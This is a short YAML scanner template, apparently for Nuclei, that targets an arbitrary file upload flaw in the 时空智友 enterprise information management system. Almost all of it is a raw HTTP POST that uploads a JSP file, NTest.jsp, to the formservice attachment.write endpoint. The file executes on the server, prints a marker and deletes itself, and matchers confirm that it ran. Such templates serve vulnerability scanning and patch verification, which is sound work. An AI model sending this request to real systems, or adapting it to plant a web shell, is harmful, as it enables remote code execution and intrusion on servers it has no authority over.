id: shikong-zhiyou-file-upload

info:
  name: "时空智友企业信息管理系统 sendCompanyLogo 接口任意文件上传"
  author: 0dayPoc
  severity: high
  description: |-
    该系统 sendCompanyLogo 接口存在文件上传路径验证缺陷，攻击者可构造恶意请求上传可执行文件。
  tags: 时空智友企业信息管理系统

http:
- raw:
  - |
    POST /formservice?service=attachment.write&isattach=false&filename=NTest.jsp HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
